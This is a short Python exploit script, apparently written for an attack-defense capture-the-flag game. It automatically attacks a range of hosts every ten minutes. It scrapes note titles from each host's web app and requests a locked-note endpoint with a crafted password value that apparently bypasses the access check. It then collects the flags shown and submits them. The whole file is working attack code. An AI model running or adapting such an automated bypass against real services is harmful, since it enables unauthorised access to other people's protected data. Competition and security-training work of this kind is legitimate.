from attack import *
from attack_targets import ip_range, Target
from EsseSubmitter import EsseSubmitter
import requests
from xml.etree import ElementTree

ips = ip_range(10, 10, 40, 101, 132)
ips = [ip for ip in ips if ip != "10.10.40.108"]

targets = [Target(ip, 8000) for ip in ips]


@local
@every(minutes=10, seconds=0)
@attack(targets)
@submit(EsseSubmitter)
def exploit(target: Target):
    flags = []
    print(target.get_host_str())
    response = requests.get(f"https://{target.get_host_str()}/", verify=False)

    lines = response.text.splitlines()

    notes = []
    for l in lines:
        if "card-title" in l:
            notes.append(l)

    note_names = []
    for note in notes:
        x = ElementTree.fromstring(note)
        note_names.append(x.text)

    for note_name in note_names:
        note_url = f"https://{target.get_host_str()}/locked?title={note_name}&password=entry['note_password']"
        response = requests.get(note_url,
                                verify=False)

        valid_flag = False
        response_lines = response.text.splitlines()
        for l in response_lines:
            if "card-subtitle" in l and "Flag" in l:
                valid_flag = True

            if "card-text" in l and valid_flag:
                flags.append(ElementTree.fromstring(l).text)

    return flags
